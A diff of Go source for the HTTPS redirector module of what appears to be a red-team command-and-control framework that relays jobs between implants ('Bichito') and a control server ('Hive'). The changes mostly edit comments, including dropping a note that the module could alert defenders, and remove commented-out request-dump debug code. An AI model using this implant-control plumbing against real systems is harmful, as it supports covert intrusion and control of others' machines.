@@ -5,9 +5,9 @@
 //					 generated previously in Implant Generation. The Bichito checks the target tls
 //					 signature to make sure is the redirector
 //
-//   Warnings:       Could not work with MITM tls proxies, and could alert Blues					 
+//   Warnings:       Could not work with MITM tls proxies.					 
 //					 
-//	 Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//	 Fingenprint:    GO-LANG TLS Libraries for the http Server 
 //
 //   IOC Level:      Medium
 //   
@@ -30,6 +30,10 @@ import (
 
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type RedParanoidhttps struct {
 	Port string   `json:"port"`
 }
@@ -39,7 +43,13 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
-// Transport Level Socket Function
+/*
+Description: Paranoidhttps Module Redirector Handler
+Flow:
+A. Extract from the JSON Encoded string the parameters needed for this module
+B. Start the https servlet. Define Endpoints.
+C. Start the https server
+*/
 
 func bichitoHandler(){
 
@@ -107,17 +117,7 @@ func SendJobs(w http.ResponseWriter, r *http.Request) {
         return
     }    
 
-    //Debug: Send Hive Jobs to Bichito
-    /*
-    requestDump, err2 := httputil.DumpRequest(r, true)
-    if err2 != nil {
-        fmt.Println(err2)
-    }
-    fmt.Println(string(requestDump))
-    */
-
     json.NewEncoder(w).Encode(getBiJobs(bid))
-
     
 }
 
@@ -138,15 +138,6 @@ func ReceiveJob(w http.ResponseWriter, r *http.Request) {
 		go addLog("Jobs(Error Decoding Bichito Job)"+err.Error())
 		return
     }
-
-    //Debug: Get the Jobs from Bichito and send to Hive
-    /*
-    requestDump, err2 := httputil.DumpRequest(r, true)
-    if err2 != nil {
-        fmt.Println(err)
-    }
-    fmt.Println(string(requestDump))
-    */
 
     go processJobs(jobs)
 
